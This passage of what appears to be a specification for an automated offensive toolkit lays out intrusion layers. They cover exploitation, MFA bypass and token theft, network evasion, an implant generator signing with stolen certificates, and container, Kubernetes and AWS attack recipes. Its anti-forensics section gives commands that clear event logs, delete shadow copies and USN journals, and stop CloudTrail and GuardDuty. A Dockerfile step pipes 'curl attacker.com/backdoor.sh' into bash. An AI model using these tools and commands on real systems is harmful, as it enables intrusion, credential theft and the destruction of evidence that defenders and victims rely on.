EX-03 privesc Potato→NT AUTHORITY\SYSTEM (lab Win2022)
EX-04 supply-chain npm → install → reverse shell (lab registry)
EX-05 USB HID → payload drop → auto-execute (lab air-gap)
EX-06 exploit + L6 evasion → 0 detection (CrowdStrike lab)
```

### 21.10 Usage
```
exploit scan --target web.corp.com --nuclei
exploit cve --id CVE-2024-1234 --target host.local --payload reverse
exploit phish --pretext "invoice" --attachment macro.xlsx --callback C2
exploit privesc --method potato --target dc01
exploit chain --recon target.com --exploit auto --persist L9 --exfil L12
```

---

## 22. LAYER 19 — FORENSIC / ANALYSIS

### 22.1 Volatility (5 modules)
V1 **MEMORY_DUMP** — capture live memory (avml/winpmem/volatility).
V2 **PROCESS_TREE** — process tree analysis (parent-child, injection detect).
V3 **NETWORK_CONN** — active connections, sockets, DNS cache.
V4 **REGISTRY_DUMP** — registry hive offline parse.
V5 **FILE_CARVE** — recover deleted files from memory image.

### 22.2 Disk Forensic (5)
D1 **IMAGING** — bit-by-bit disk image (dd, ewf, FTK).
D2 **PARTITION_ENUM** — GPT/MBR parse, hidden partitions.
D3 **TIMELINE** — $MFT + $UsnJrnl timeline construction.
D4 **RECYCLE_BIN** — $Recycle.Bin parse, restore deleted.
D5 **SHADOW_COPY** — VSS snapshot enumeration and extraction.

### 22.3 Artifact Analysis (7)
A1 **BROWSER_HIST** — Chrome/Edge/Firefox history + cache.
A2 **RECENT_FILES** — Windows Recent (LNK), Linux ~/.recently-used.xbel.
A3 **LNK_ANALYSIS** — .lnk file metadata (MAC addresses, USB serial).
A4 **JUMPLIST** — Windows JumpList parse (AppID, recent docs).
A5 **PREFETCH** — Windows Prefetch (execution evidence).
A6 **AMCACHE** — AmCache.hve (installed program evidence).
A7 **EVENT_LOG** — Windows Event Log parse (Security, System, PowerShell).

### 22.4 Network Forensic (4)
N1 **PCAP_ANALYSIS** — tshark/wireshark integration (traffic parse).
N2 **DNS_LOG** — DNS query/response log analysis.
N3 **FLOW_DATA** — NetFlow/sFlow/IPFIX analysis.
N4 **TLS_INSPECT** — JA3/JA3S fingerprint analysis + cert chain parse.

### 22.5 Cloud Forensic (4)
C1 **SNAPSHOT_ANALYSIS** — cloud instance snapshot forensics.
C2 **AUDIT_LOG** — AWS CloudTrail / Azure Activity Log / GCP Audit Log.
C3 **S3_FORENSIC** — S3 access log + version history analysis.
C4 **IDENTITY_FORENSIC** — IAM role usage, credential report.

### 22.6 Anti-Forensic Detect (4)
F1 **TIMESTOMPING** — detect modified timestamps (compare multiple sources).
F2 **LOG_EVASION** — detect log gaps/anomalies (usnjrnl gap analysis).
F3 **FILELESS_DETECT** — detect fileless malware artifacts (ETW, memory).
F4 **STEGANOGRAPHY** — detect hidden data in images/files (steg detect).

### 22.7 Report Generation (auto)
- Timeline HTML (interactive).
- Artifact inventory (JSON).
- IoC extraction (YARA rules, Sigma rules, Sigma rules).
- Attack chain diagram (MITRE ATT&CK mapping).

### 22.8 Test
```
FO-01 memory dump → process injection detected (lab)
FO-02 disk image → timeline correct (event correlation)
FO-03 amcache → installed program enumeration (lab)
FO-04 pcap → C2 traffic identified (lab)
```

### 22.9 Usage
```
forensic memory --target dc01 --output report/
forensic disk --image evidence.E01 --timeline --artifact
forensic cloud --provider aws --cloudtrail-parse
forensic report --format html --mitre-map
```

---

## 23. LAYER 20 — REPORTING & DOCUMENTATION

### 23.1 Report Types (6)
R1 **EXECUTIVE** — non-technical summary; business impact; risk matrix.
R2 **TECHNICAL** — full detail: findings, PoC, reproduction steps, fix.
R3 **MITRE_MAP** — ATT&CK technique mapping per finding.
R4 **INDICATOR** — IoC list (IP, domain, hash, YARA rule, Sigma rule).
R5 **TIMELINE** — attack timeline (Gantt/visual).
R6 **COMPLIANCE** — framework mapping (PCI-DSS, NIST, ISO27001).

### 23.2 Automation (5)
A1 **AUTO_CAPTURE** — all actions logged (L14 monitor) → report source.
A2 **SCREENSHOT** — key moments captured (web vuln, shell, data access).
A3 **PCAP_ATTACHMENT** — network evidence linked to findings.
A4 **POC_SCRIPT** — reproduction script (bash/Python) per finding.
A5 **TEMPLATE** — report templates (HTML/PDF/LaTeX) per audience.

### 23.3 Delivery (3)
D1 **ENCRYPTED_PDF** — password-protected PDF.
D2 **SECURE_SHARE** — upload to secure portal (pre-auth).
D3 **SIGNED_ARTIFACT** — PGP/GPG signed report package.

### 23.4 Fallback
```
if automated report incomplete → manual supplement
if delivery channel down → queue (L14 checkpoint)
if encryption key issue → symmetric re-key
```

### 23.5 Test
```
RP-01 exec report: non-technical, correct risk matrix
RP-02 tech report: all findings with PoC (lab verified)
RP-03 MITRE map: correct technique mapping (100% coverage)
RP-04 IoC: extract valid YARA rules from findings
```

### 23.6 Usage
```
report create --type exec,tech,mitre --scope "Penetration Test"
report capture --screenshot --pcap
report deliver --format encrypted_pdf --recipient admin@corp.com
```

## 24. LAYER 21 — CLEANUP & ANTI-FORENSICS

### 24.1 Modul ARTIFACT CLEANUP (12 langkah terukur)

A1 **EVENT_LOG_PURGE** — wevtutil cl Security/System/Application/Powershell/
   Microsoft-Windows-PowerShell/Operational. Advanced: selectively remove
   entries via XML delete (bakarus ke L6 9.5 log cleanup).
A2 **AMCACHE_PURGE** — reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
   \AppCompatCache (AmCache.hve).
A3 **PREFETCH_PURGE** — del %SystemRoot%\Prefetch\* /Q (filter: hanya file
   yang date range sesuai operasi).
A4 **USN_JOURNAL** — fsutil usn deletejournal /d C: (pembersihan cepat).
A5 **RECYCLE_BIN** — rd /s /q C:\$Recycle.Bin (level administrator).
A6 **SHELL_HISTORY** — PowerShell PSReadLine consolehost_history.json + 
   bash .bash_history / .zsh_history.
A7 **BROWSER_ARTIFACT** — hapus URL history cache, download list cache,
   session restore (Chrome: History + Cookies terkait).
A8 **FILE_TIMESTOMPING** — touch/ntfsutime: restore MAC timestamps
   (modified/created/accessed) dari template legit file.
A9 **ADS_PURGE** — hapus alternate data streams (Zone.Identifier, hidden).
A10 **REGISTRY_PURGE** — MRU (recent), ShimCache, UserAssist, BAM entries.
A11 **MEMORY_WIPE** — zero-fili process memory, wipe page file (if accessible).
A12 **VSS_PURGE** — vssadmin delete shadows /all (hide backup evidence).

### 24.2 Modul TIMELINE ANTI-FORENSICS (6)
T1 **TIMELINE_OBFUSCATE** — satukan timestamp dengan file legit (bulk touch).
T2 **JOURNAL_STUFFING** — isi USN journal dengan noise entries (random file ops).
T3 **LOG_PAD** — tambah entries log palsu (event IDs yang legit tapi berbeda timestamp).
T4 **REG_PAD** — hapus registry entries (AppCompatCache, AmCache) + refresh
   dengan entries palsu (tidak perlu; lebih baik hanya hapus).
T5 **CLOCK_SKEW** — manipulasi system clock sebelum operasi → forensic timeline error.
T6 **EVENTID_MASKING** — generate legit events (logon type 3, service install)
   untuk masking activity timeline.

### 24.3 Modul MEMORY FORENSIC COUNTERMEASURE (4)
M1 **MEMORY_ENCRYPT** — sleep region enkripsi (L6 T5/T11) → forensic dump tidak
   menunjukkan plaintext payload.
M2 **MEMORY_ZEROING** — zero page setelah use (SecureZeroMemory).
M3 **MEMORY_MMAP_DELETE** — mmap/munmap cycle → virtual address tidak mappable.
M4 **MEMORY_FILL** — fill dengan pattern legit (padding) → anti-yara scan.

### 24.4 Modul NETWORK FORENSIC COUNTERMEASURE (4)
N1 **PCAP_PURGE** — hapus local pcap captures (tcpdump output).
N2 **DNS_CACHE_PURGE** — ipconfig /flushdns + /displaydns → hapus entries.
N3 **ARP_PURGE** — netsh interface ip delete arpcache (per-adapter).
N4 **CONNECTION_PURGE** — netstat -ano → kill process + clear connection table
   (tidak bisa di-clear; tapi kill process menghapus).
N5 **PROXY_CLEANUP** — hapus proxy configuration (IE/system/proxy.pac).

### 24.5 Modul CLOUD FORENSIC COUNTERMEASURE (3)
C1 **CLOUDTRAIL_PURGE** — delete trail (via API; latencies: event still in buffers).
C2 **AUDIT_LOG_PURGE** — Azure/GCP audit log deletion (admin only).
C3 **S3_VERSION_PURGE** — S3 bucket versioning: delete versions + markers.

### 24.6 Modul FULL SCOPE WIPING (2)
W1 **DB_WIPE** — database: TRUNCATE + log purge (L13) + backup erase.
W2 **OS_WIPE** — filesystem: cipher /w, DBAN, sdelete (NIST 800-88 compliant).

### 24.7 Fallback chain
```
target = workstation: A1→A3→A4→A5→A6→A8→A10→A12
target = server: A1→A2→A4→A12→A11→T2→T3
target = cloud: C1→C2→C3
full scope: all + W1 + W2 (with safety check)
```

### 24.8 Edge (10)
```
EDGE-01: EDR logs central → local purge insufficient; plan: need server-side (C2 event scrub)
EDGE-02: VSS not accessible → skip A12; use timing (run before snapshot creation)
EDGE-03: USN journal locked → retry with exclusive lock
EDGE-04: process memory locked → skip M1/M2; focus on disk cleanup
EDGE-05: cloud API rate limit → retry with backoff
EDGE-06: filesystem read-only → remount rw (if root/system)
EDGE-07: encryption key lost → cannot decrypt cleanup tools; re-download
EDGE-08: DMS → abort cleanup, ensure no partial evidence left
EDGE-09: reboot before cleanup completes → checkpoint + resume
EDGE-10: forensic imaging in-progress → detect + abort cleanup (if in evidence)
```

### 24.9 Test
```
CL-01: workstation full cleanup → 0 artifacts in forensic image
CL-02: server cleanup → no event gaps detectable (timeline obfuscation)
CL-03: memory cleanup → no plaintext in memory dump
CL-04: cloud cleanup → audit log gaps not detectable
CL-05: full scope wipe → NIST 800-88 compliant
```

### 24.10 Usage
```
cleanup workstation --full
cleanup server --selective --avoid [amcache,prefetch]
cleanup cloud --trail-delete --audit-purge
cleanup memory --wipe --encrypt-sleep
cleanup forensic --timeline-obfuscate --padding
```

---

## 25. LAYER 22 — AUTHENTICATION BYPASS (7 modules)

### 25.1 PASSWORD_SPRAY (3)
S1 **DEFAULT_CRED** — common default: admin:admin, test:test, Administrator:Passw0rd.
S2 **SPRAY_TIMED** — spray per-lockout-window (1 attempt per user per N hours).
S3 **LOCKOUT_AWARE** — track failed per-account, rotate targets, avoid lockout.

### 25.2 TOKEN_HIJACK (4)
T1 **TOKEN_STEAL** — duplicate token dari process (L8 ptt).
T2 **COOKIE_HIJACK** — session cookie theft (L11 browser chain).
T3 **OAUTH_ABUSE** — refresh token theft → impersonate.
T4 **SAML_HIJACK** — SAML assertion theft (via forged token, L7 K5).

### 25.3 MFA_BYPASS (6)
M1 **OTP_RELAY** — NTLM relay → OTP capture → relay OTP (timing window).
M2 **PUSH疲劳攻击** — push notification spam (MFA fatigue) → user approves.
M3 **TOTP_REPLAY** — capture TOTP → replay (time-limited window).
M4 **FIDO phish** — real-time phishing proxy (evilginx2) → relay FIDO/WebAuthn.
M5 **SESSION_COOKIE** — steal authenticated session cookie (bypass MFA entirely).
M6 **BACKUP_CODES** — steal backup codes (L11 DevGrabber path).

### 25.4 LDAP_BYPASS (3)
L1 **BIND_AS_SERVICE** — service account LDAP bind → impersonate user.
L2 **LDAP_INJECT** — filter injection → bypass authentication checks.
L3 **NULL_BASED** — null DN bind (anonymous access misconfig).

### 25.5 OAUTH_SSO_BYPASS (4)
O1 **TOKEN_THEFT** — OAuth token from browser/app (refresh token).
O2 **REDIRECT_ABUSE** — open redirect → steal authorization code.
O3 **IMPLICIT_ABUSE** — implicit grant → token in URL fragment.
O4 **DEVICE_CODE_ABUSE** — device code flow → user authorization theft.

### 25.6 CLOUD_AUTH_BYPASS (4)
B1 **AWS_ACCESSKEY** — steal access keys (L11 DevGrabber).
B2 **AZURE_SASTOKEN** — steal shared access signature (storage/blob).
B3 **GCP_SAKEY** — steal service account key (JSON).
B4 **K8S_SA_TOKEN** — steal service account token (/var/run/secrets).

### 25.7 Fallback chain
```
password_spray → token_hijack → mfa_bypass → oauth_sso_bypass → cloud_auth
by target: enterprise → LDAP→AD; SaaS → OAuth→SAML; Cloud → cloud_auth
```

### 25.8 Test
```
AB-01: password spray → 1 account hit (lockout-aware, no lockout)
AB-02: cookie hijack → session reuse (browser lab)
AB-03: MFA fatigue → push approved (lab)
AB-04: OAuth redirect abuse → code captured
```

---

## 26. LAYER 23 — NETWORK EVASION (8 modules)

### 26.1 DOMAIN_FRONTING (4)
F1 **CLOUDFLARE_FRONT** — CDN front domain → backend hidden.
F2 **AWS_CLOUDFRONT** — CloudFront + custom origin.
F3 **AZURE_FRONTDOOR** — Azure CDN + origin.
F4 **GCP_CDN** — Google Cloud CDN + backend.

### 26.2 PROXY_CHAIN (4)
P1 **SOCKS5_CHAIN** — multi-hop SOCKS5 (L8 V1).
P2 **HTTP_PROXY** — Squid/NTLM auth chain.
P3 **TOR** — onion routing (for anonymity, not speed).
P4 **VPN_CHAIN** — WireGuard → Tor → SOCKS5 (multi-layer).

### 26.3 DNS_EVASION (4)
D1 **DNS_OVER_HTTPS** — DoH (Cloudflare/Google) → bypass DNS monitoring.
D2 **DNS_OVER_TLS** — DoT → encrypted DNS.
D3 **DNS_FASTFLUX** — rapid IP rotation (A record).
D4 **DNS_DOMAIN_ROTATION** — domain generation algorithm (DGA).

### 26.4 TLS_EVASION (4)
E1 **JA3_RANDOM** — JA3 fingerprint randomization (Section 4.2).
E2 **TLS13** — force TLS 1.3 (no legacy cipher suite exposure).
E3 **CUSTOM_CIPHERSUITE** — cipher order manipulation.
E4 **CERT_PIN** — self-signed cert (if target allows, bypass cert-check).

### 26.5 TRAFFIC_OBFUSCATION (4)
O1 **LEGIT_TRAFFIC_MERGE** — embed in legitimate traffic (TLS, HTTP/2).
O2 **PACKET_PADDING** — pad packets to uniform size (anti-traffic analysis).
O3 **TIMING_OBFUSCATE** — jitter between packets (anti-traffic analysis).
O4 **PROTOCOL_MIMICRY** — mimic legitimate protocols (DNS, HTTPS, SSH).

### 26.6 ENCRYPTION (4)
EN1 **PAYLOAD_ENCRYPT** — AES-256-GCM (Section 4.4).
EN2 **TRANSPORT_ENCRYPT** — TLS 1.3 (Section 4.2).
EN3 **CHANNEL_ENCRYPT** — WireGuard (L16 N2).
EN4 **FILE_ENCRYPT** — gpg/age (L16 K3).

### 26.7 RATE_LIMIT_BYPASS (4)
R1 **DISTRIBUTED_REQUEST** — spread across multiple IPs/endpoints.
R2 **TIME_SPREAD** — distribute requests over time (anti-throttle).
R3 **USER_AGENT_ROTATE** — rotate UA per-request.
R4 **HEADER_RANDOMIZE** — random header order + values.

### 26.8 C2_CHANNEL_ROTATION (4)
C1 **MULTI_CHANNEL** — C2 via multiple channels (L1 CH-1..CH-18).
C2 **CHANNEL_FAILOVER** — auto-switch on detection (Section 4.1).
C3 **CHANNEL_ENCRYPT** — per-channel encryption key.
C4 **CHANNEL_DIVERSITY** — different protocol per channel (diversify risk).

### 26.9 Fallback
```
if primary channel blocked → secondary (C2 rotation)
if DNS blocked → DoH/DoT → Tor → VPN chain
if TLS fingerprint detected → JA3 randomization
if traffic analysis suspected → packet padding + timing obfuscation
```

### 26.10 Test
```
NE-01: domain fronting → CDN → backend hidden (valid response)
NE-02: proxy chain → 3 hops → connectivity maintained
NE-03: DNS evasion → DoH → bypass DNS monitoring
NE-04: JA3 random → 5 requests → 5 different JA3 hashes
NE-05: traffic obfuscation → packet size uniform (±5%)
```

---

## 27. LAYER 24 — FULL SCOPE ATTACK SIMULATION (10 phases)

> End-to-end simulation: semua 25 layer integrated dalam 1 workflow.

### 27.1 Phase 1: RECON (Layer 17)
Target → OSINT → subdomain → port → service → fingerprint → vuln candidate.

### 27.2 Phase 2: WEAPONIZE (Layer 18)
Vulnerability → payload selection → weaponize → delivery mechanism.

### 27.3 Phase 3: DELIVER (Layer 18)
Phishing / web exploit / USB / supply-chain → target compromise.

### 27.4 Phase 4: EXPLOIT (Layer 18)
Trigger payload → initial shell → verify access.

### 27.5 Phase 5: INSTALL (Layer 9 + 6)
Persistence (registry/task/service) + stealth (evasion: sleep mask + syscall gate + AMSI bypass).

### 27.6 Phase 6: CREDENTIAL (Layer 11)
Browser chain (MCE→DBS→ChromeElevator→RawCopy→DevGrabber) + LSASS dump + wallet + vault.

### 27.7 Phase 7: LATERAL (Layer 7 + 8)
AD recon → Kerberos/ADCS → DCSync → PTH/SMB lateral → pivot → more targets.

### 27.8 Phase 8: COLLECT (Layer 12)
Scope target → harvest (fs/mail/chat/db/cloud) → stage → encrypt → exfil.

### 27.9 Phase 9: REPORT (Layer 20)
Timeline → findings → IoC → MITRE mapping → executive + technical report.

### 27.10 Phase 10: CLEANUP (Layer 21)
Artifact cleanup → timeline obfuscation → memory wipe → evidence removal.

### 27.11 Integration matrix

```
| Phase | Layers Used | Orchestrator Role | Brain Decision |
|-------|-------------|-------------------|----------------|
| 1. Recon | L17, L4 | adapter + planner | agent_recon task |
| 2. Weapon | L18, L15 | planner + runner | agent_exploit task |
| 3. Deliver | L18, L1 | runner | delivery_channel_select |
| 4. Exploit | L18, L5, L6 | runner + coordinator | technique_adapt |
| 5. Install | L9, L6, L10 | runner | persistence_method_select |
| 6. Cred | L11, L14 | runner + checkpoint | cred_chain_orchestrate |
| 7. Lateral | L7, L8, L14 | coordinator | pivot_path_calc |
| 8. Collect | L12, L20, L23 | runner + monitor | exfil_channel_select |
| 9. Report | L20, L19 | runner + monitor | report_template_select |
| 10. Clean | L21, L6 | runner + checkpoint | cleanup_scope_calc |
```

### 27.12 Test
```
FS-01: full cycle simulation (lab environment) → end-to-end success
FS-02: all 25 layers integrated → no crash, no data loss
FS-03: orchestrator coordinates all phases → correct phase transitions
FS-04: brain decisions → risk-aware, blast-radius checked
FS-05: cleanup → 0 artifacts left (forensic clean)
FS-06: report → comprehensive (all findings captured)
```

---

## 28. LAYER 25 — IMPLANT GENERATOR

### 28.1 Templates (5)
T1 **SHELLCODE_GEN** — multi-arch shellcode (x86/x64/arm64) from C/Rust.
T2 **DLL_GEN** — reflective DLL generator (injectable, L6 compatible).
T3 **MACRO_GEN** — VBA macro generator (obfuscated, AMSI bypass).
T4 **LNK_GEN** — shortcut generator (icon spoof, command injection).
T5 **POWERSHELL_GEN** — encoded PS1 generator (obfuscated, L6 compatible).

### 28.2 Configuration (5)
C1 **C2_CONFIG** — C2 address, protocol, sleep interval, encryption key.
C2 **EVADE_CONFIG** — sleep method, syscall gate, AMSI method, unhook method.
C3 **PERSIST_CONFIG** — persistence method, auto-reinstall flag.
C4 **EXFIL_CONFIG** — exfil channel, chunk size, encryption.
C5 **STEALTH_CONFIG** — anti-debug, anti-VM, anti-sandbox flags.

### 28.3 Build Pipeline (4)
B1 **COMPILE** — Rust/C/ASM compile (cross-compile for target arch).
B2 **OBFUSCATE** — string encryption, control flow flattening, dead code injection.
B3 **SIGN** — code signing (stolen/valid cert or self-signed).
B4 **PACK** — UPX/custom packer (anti-static analysis).

### 28.4 Output Formats (5)
F1 **RAW_SHELLCODE** — bin file (for injection).
F2 **DLL** — injectable DLL (L6 compatible).
F3 **EXE** — standalone executable.
F4 **MACRO** — VBA module (for Office).
F5 **POWERSHELL** — encoded script.

### 28.5 Test
```
IG-01: shellcode gen → valid x64 shellcode (run in test harness)
IG-02: DLL gen → injectable (L6 CRT successful)
IG-03: macro gen → AMSI bypass (L6 A2) successful
IG-04: full build pipeline → output under detection threshold
```

### 28.6 Usage
```
implant gen --arch x64 --c2 https://c2.corp.com --evade ekko+hellsgate
implant gen --macro --obfuscate --sign stolen_cert.pfx
implant config --show  # display current template
implant build --output ./payload/ --format all
```

---

## 29. MODUL TAMBAHAN v2 (LAYER 26–40)

### 29.1 Container & Kubernetes Security

```
DOCKER (8):

1. DOCKER_ESCAPE
   WHAT: Escape container ke host filesystem
   HOW:
   ├── Mount host root: mount -t proc none /tmp/proc
   ├── Access host: chroot /tmp/proc
   └── Execute on host: chroot /tmp/proc /bin/bash
   REQUIREMENTS: --privileged atau SYS_ADMIN capability
   DETECTION: Monitor mount syscalls, /proc access
   BYPASS: Use /proc/self/root method

2. DOCKER_SOCKET
   WHAT: Mount /var/run/docker.sock → full Docker control
   HOW:
   ├── docker run -v /var/run/docker.sock:/var/run/docker.sock
   ├── Access Docker API via socket
   ├── Create privileged container
   └── Escape to host
   DETECTION: Docker socket access
   BYPASS: Use alternate method

3. DOCKER_SECRET
   WHAT: Extract secrets dari containers
   HOW:
   ├── docker exec container cat /run/secrets/secret_name
   ├── Or: docker inspect → find secret mounts
   └── Extract credentials, API keys
   DETECTION: Secret file access
   BYPASS: Use alternate method

4. DOCKER_NETWORK
   WHAT: Sniff bridge network traffic
   HOW:
   ├── docker run --net=container:target_container
   ├── Capture network traffic
   └── Extract credentials from traffic
   DETECTION: Network sniffing
   BYPASS: Use alternate method

5. DOCKER_BUILD
   WHAT: Inject backdoor via malicious Dockerfile
   HOW:
   ├── Modify Dockerfile: RUN curl attacker.com/backdoor.sh | bash
   ├── Build image: docker build -t backdoored .
   ├── Push to registry
   └── Users pull backdoored image
   DETECTION: Dockerfile audit
   BYPASS: Use alternate method

6. DOCKER_REGISTRY
   WHAT: Poison Docker registry → malicious images
   HOW:
   ├── Access registry API
   ├── Replace legitimate image with backdoored version
   ├── Update tags
   └── Users pull poisoned image
   DETECTION: Registry integrity checks
   BYPASS: Use alternate method

7. DOCKER_COMPOSE
   WHAT: Manipulate docker-compose.yml → malicious config
   HOW:
   ├── Add privileged: true
   ├── Add volumes: /:/host
   ├── Add environment variables with credentials
   └── Deploy malicious stack
   DETECTION: Compose file audit
   BYPASS: Use alternate method

8. DOCKER_INVENTORY
   WHAT: Enumerate all containers
   HOW:
   ├── docker ps -a → list all containers
   ├── docker inspect → get details
   ├── Find vulnerable containers
   └── Target weak configurations
   DETECTION: Container enumeration
   BYPASS: Use alternate method

KUBERNETES (12):

1. K8S_API
   WHAT: Access K8s API server (unauthenticated/low-priv)
   HOW:
   ├── kubectl get pods (if anonymous access)
   ├── kubectl get secrets
   ├── kubectl create deployment
   └── kubectl exec into pods
   DETECTION: API server access logs
   BYPASS: Use service account

2. K8S_ETCD
   WHAT: Dump etcd → all cluster secrets
   HOW:
   ├── Access etcd (port 2379)
   ├── etcdctl get / --prefix
   ├── Extract all secrets
   └── Decrypt with etcd key
   DETECTION: Etcd access
   BYPASS: Use alternate method

3. K8S_SECRETS
   WHAT: Extract Secrets from namespace
   HOW:
   ├── kubectl get secrets -n namespace
   ├── kubectl get secret secret_name -o yaml
   ├── Decode: echo "base64" | base64 -d
   └── Extract credentials, API keys
   DETECTION: Secret access
   BYPASS: Use alternate method

4. K8S_CONFIGMAP
   WHAT: Read/modify ConfigMaps
   HOW:
   ├── kubectl get configmaps
   ├── kubectl get configmap name -o yaml
   ├── Modify configuration
   └── Inject malicious settings
   DETECTION: ConfigMap modification
   BYPASS: Use alternate method

5. K8S_RBAC
   WHAT: RBAC privesc → cluster-admin binding
   HOW:
   ├── kubectl create clusterrolebinding backdoor \
   │   --clusterrole=cluster-admin \
   │   --serviceaccount=default:backdoor
   ├── Now have cluster-admin access
   └── Full cluster control
   DETECTION: RBAC changes
   BYPASS: Use alternate method

6. K8S_SERVICE_ACCOUNT
   WHAT: Abuse service account tokens
   HOW:
   ├── Find service account token: /var/run/secrets/kubernetes.io/serviceaccount/token
   ├── Use token to access API
   ├── kubectl --token=token get pods
   └── Access other namespaces
   DETECTION: Service account token usage
   BYPASS: Use alternate method

7. K8S_POD
   WHAT: Inject malicious container into pod
   HOW:
   ├── kubectl run backdoor --image=alpine --restart=Never -- sleep 3600
   ├── kubectl exec -it backdoor -- /bin/sh
   ├── Access host via shared namespaces
   └── Escape to host
   DETECTION: Pod creation
   BYPASS: Use alternate method

8. K8S_NODE
   WHAT: Get node shell via privileged pod
   HOW:
   ├── kubectl run node-shell --image=alpine --privileged --hostPID=true
   ├── chroot /host
   └── Full node access
   DETECTION: Privileged pod creation
   BYPASS: Use alternate method

9. K8S_NETWORK
   WHAT: Bypass network policies
   HOW:
   ├── Find pods without network policies
   ├── Access services directly
   ├── Use DNS for service discovery
   └── Bypass network segmentation
   DETECTION: Network policy violations
   BYPASS: Use alternate method

10. K8S_ADMISSION
    WHAT: Bypass admission controllers
    HOW:
    ├── Find admission controller gaps
    ├── Create resources that bypass validation
    ├── Use alternate API paths
    └── Bypass security policies
    DETECTION: Admission controller logs
    BYPASS: Use alternate method

11. K8S_CRONJOB
    WHAT: Persist via CronJob
    HOW:
    ├── kubectl create cronjob backdoor --image=alpine --schedule="*/1 * * * *" -- sleep 3600
    ├── CronJob executes periodically
    └── Persistent access
    DETECTION: CronJob creation
    BYPASS: Use alternate method

12. K8S_HELM
    WHAT: Poison Helm chart → malicious deployment
    HOW:
    ├── Modify Helm chart values.yaml
    ├── Add malicious containers
    ├── Deploy poisoned chart
    └── Malicious pods deployed
    DETECTION: Helm chart audit
    BYPASS: Use alternate method

CONTAINER PRIVESC (6):

1. CAP_SYS_ADMIN
   WHAT: Abuse SYS_ADMIN capability
   HOW:
   ├── Container has SYS_ADMIN capability
   ├── Mount host filesystem
   ├── Access host resources
   └── Escape to host
   DETECTION: Capability abuse
   BYPASS: Use alternate method

2. PRIVILEGED_CONTAINER
   WHAT: Escape privileged container
   HOW:
   ├── Container runs with --privileged
   ├── Full host access
   ├── Mount host filesystem
   └── Execute on host
   DETECTION: Privileged container detection
   BYPASS: Use alternate method

3. HOSTPID
   WHAT: Access host PID namespace
   HOW:
   ├── --hostPID=true
   ├── Access /proc/1/ns/pid
   ├── Enter host PID namespace
   └── See all host processes
   DETECTION: PID namespace access
   BYPASS: Use alternate method

4. HOSTIPC
   WHAT: Access host IPC namespace
   HOW:
   ├── --hostIPC=true
   ├── Access shared memory segments
   ├── Communicate with host processes
   └── Extract data
   DETECTION: IPC namespace access
   BYPASS: Use alternate method

5. HOSTNETWORK
   WHAT: Access host network namespace
   HOW:
   ├── --hostNetwork=true
   ├── Access host network stack
   ├── Sniff host traffic
   └── Bypass network policies
   DETECTION: Network namespace access
   BYPASS: Use alternate method

6. HOSTPATH
   WHAT: Access host filesystem via hostPath
   HOW:
   ├── volumeMounts: hostPath: /host
   ├── Access host filesystem
   ├── Read/write host files
   └── Escape to host
   DETECTION: hostPath access
   BYPASS: Use alternate method
```

**Fallback:**
Docker Socket → Container Escape → K8s API → Etcd Dump →
Service Account → Pod Injection → Node Shell → ALERT

---

### 29.2 Cloud Deep (AWS/Azure/GCP)

```
AWS (20):

1. IAM_PRIVESC
   WHAT: Escalate IAM privileges
   HOW:
   ├── Create new policy with full access: iam:CreatePolicy
   ├── Attach policy to self: iam:AttachUserPolicy
   └── Now have full AWS access
   DETECTION: IAM policy changes
   BYPASS: Use alternate method

2. IAM_USER
   WHAT: Create backdoor user
   HOW:
   ├── iam:CreateLoginProfile → create user with password
   ├── iam:UpdateLoginProfile → change password
   └── Login as backdoor user
   DETECTION: New user creation
   BYPASS: Use alternate method

3. IAM_ROLE
   WHAT: Create role for privilege escalation
   HOW:
   ├── iam:CreateRole → create role with trust policy
   ├── iam:PassRole → assume role
   └── Access as role
   DETECTION: Role creation
   BYPASS: Use alternate method

4. LAMBDA
   WHAT: Create Lambda function for persistence
   HOW:
   ├── lambda:CreateFunction → deploy backdoor
   ├── lambda:InvokeFunction → execute
   └── Function runs in AWS environment
   DETECTION: Lambda function creation
   BYPASS: Use alternate method

5. S3_BUCKET
   WHAT: Access S3 buckets
   HOW:
   ├── s3:PutBucketPolicy → modify bucket policy
   ├── s3:PutObject → upload files
   └── Access bucket data
   DETECTION: S3 policy changes
   BYPASS: Use alternate method

6. EC2_INSTANCE
   WHAT: Create EC2 instance for access
   HOW:
   ├── ec2:RunInstances → launch instance
   ├── ec2:CreateKeyPair → get SSH key
   └── SSH into instance
   DETECTION: Instance creation
   BYPASS: Use alternate method

7. EBS_VOLUME
   WHAT: Snapshot EBS volume → cross-account
   HOW:
   ├── ebs:CreateSnapshot → snapshot volume
   ├── Share snapshot cross-account
   └── Access data in other account
   DETECTION: Snapshot creation
   BYPASS: Use alternate method

8. RDS
   WHAT: Access RDS database
   HOW:
   ├── rds:CreateDBSnapshot → snapshot database
   ├── rds:ModifyDBInstance → change settings
   └── Access database data
   DETECTION: RDS modifications
   BYPASS: Use alternate method

9. SECRETS_MANAGER
   WHAT: Extract secrets from Secrets Manager
   HOW:
   ├── secretsmanager:GetSecretValue → read secret
   ├── Extract credentials, API keys
   └── Use for further access
   DETECTION: Secret access
   BYPASS: Use alternate method

10. SSM_PARAMETER
    WHAT: Extract parameters from SSM
    HOW:
    ├── ssm:GetParameter → read parameter
    ├── Extract configuration data
    └── Use for further access
    DETECTION: Parameter access
    BYPASS: Use alternate method

11. KMS
    WHAT: Decrypt data with KMS
    HOW:
    ├── kms:Decrypt → decrypt encrypted data
    ├── kms:GenerateDataKey → generate new key
    └── Access encrypted data
    DETECTION: KMS operations
    BYPASS: Use alternate method

12. CLOUDTRAIL
    WHAT: Stop CloudTrail logging
    HOW:
    ├── cloudtrail:StopLogging → stop trail
    ├── Activity no longer logged
    └── Operate undetected
    DETECTION: CloudTrail stop
    BYPASS: Use alternate method

13. GUARDDUTY
    WHAT: Disable GuardDuty
    HOW:
    ├── guardduty:DeleteDetector → delete detector
    ├── Threat detection disabled
    └── Operate undetected
    DETECTION: GuardDuty deletion
    BYPASS: Use alternate method

14. VPC_FLOW
    WHAT: Delete VPC flow logs
    HOW:
    ├── vpc:DeleteFlowLogs → delete logs
    ├── Network activity no longer logged
    └── Operate undetected
    DETECTION: Flow log deletion
    BYPASS: Use alternate method

15. API_GATEWAY
    WHAT: Modify API Gateway policy
    HOW:
    ├── apigateway:UpdateRestApiPolicy → modify policy
    ├── Add backdoor access
    └── Access API
    DETECTION: API Gateway changes
    BYPASS: Use alternate method

16. ECS
    WHAT: Run privileged ECS task
    HOW:
    ├── ecs:RunTask → run privileged task
    ├── Task has host access
    └── Escape to host
    DETECTION: ECS task creation
    BYPASS: Use alternate method

17. EKS
    WHAT: Access EKS cluster
    HOW:
